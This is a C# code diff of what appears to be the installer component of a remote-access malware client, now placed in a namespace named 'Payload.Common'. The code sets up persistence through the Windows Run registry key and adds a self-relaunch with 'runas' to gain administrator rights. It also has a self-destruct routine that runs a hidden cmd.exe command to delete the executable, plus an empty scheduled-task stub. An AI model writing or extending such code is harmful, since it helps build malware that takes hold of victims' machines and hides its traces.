@@ -2,24 +2,23 @@
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
-using System.IO;
 using System.Linq;
 using System.Reflection;
-using System.Runtime.InteropServices;
 using System.Text;
-using System.Threading;
 using System.Threading.Tasks;
-using System.Windows.Forms;
+using System.IO;
+using System.Security.Principal;
 
-namespace winClient48Small
+namespace Payload.Common
 {
-    internal class Installer
+    public class clsInstaller
     {
         public string[] m_args { get; set; }
 
         public bool m_bCopyDir { get; set; }
         public bool m_bStartUp { get; set; }
         public bool m_bReg { get; set; }
+        public bool m_bScheduledTask { get; set; }
         public bool m_bUAC { get; set; }
         public bool m_bLoadToMemory { get; set; }
 
@@ -31,7 +30,7 @@ namespace winClient48Small
 
         private RegistryKey reg_key;
 
-        public Installer()
+        public clsInstaller()
         {
             reg_key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
         }
@@ -42,11 +41,16 @@ namespace winClient48Small
         public void Start()
         {
             Copy();
-            
+
             if (m_bReg)
             {
                 RegRun();
             }
+
+
+
+            if (m_bUAC)
+                UAC();
         }
 
         /// <summary>
@@ -95,12 +99,44 @@ namespace winClient48Small
             reg_key.DeleteValue(m_szRegKeyName);
         }
 
+        public void fnCreateScheduledTask(string szTaskName, string szAuthor, string szTrigger, string szProgram, string szArgument, string szUser, string szStartTime, string szRemoteServer)
+        {
+
+        }
+
+        private bool isAdmin()
+        {
+            WindowsIdentity identity = WindowsIdentity.GetCurrent();
+            WindowsPrincipal principal = new WindowsPrincipal(identity);
+
+            return principal.IsInRole(WindowsBuiltInRole.Administrator);
+        }
+
         /// <summary>
         /// UAC priviledge escalation.
         /// </summary>
         public void UAC()
         {
-            
+            if (!isAdmin())
+            {
+                ProcessStartInfo info = new ProcessStartInfo()
+                {
+                    FileName = Process.GetCurrentProcess().MainModule.FileName,
+                    UseShellExecute = true,
+                    Verb = "runas", //TRIGGER THE UAC PROMPT
+                };
+
+                try
+                {
+                    Process.Start(info);
+                }
+                catch
+                {
+
+                }
+
+                Environment.Exit(0);
+            }
         }
 
         /// <summary>
@@ -117,17 +153,11 @@ namespace winClient48Small
             entry.Invoke(instance, new object[] { alpArgs });
         }
 
-        public void fnLoadItselfIntoMemory()
-        {
-            byte[] abData = File.ReadAllBytes(Application.StartupPath);
-
-        }
-
         public void fnSelfDestroy(string szPath)
         {
             Process.Start(new ProcessStartInfo()
             {
-                Arguments = $"/C choice /C Y /N /D Y /T 5 & Del \"{Application.StartupPath}\"",
+                Arguments = $"/C choice /C Y /N /D Y /T 5 & Del \"{szPath}\"",
                 WindowStyle = ProcessWindowStyle.Hidden,
                 CreateNoWindow = true,
                 FileName = "cmd.exe",
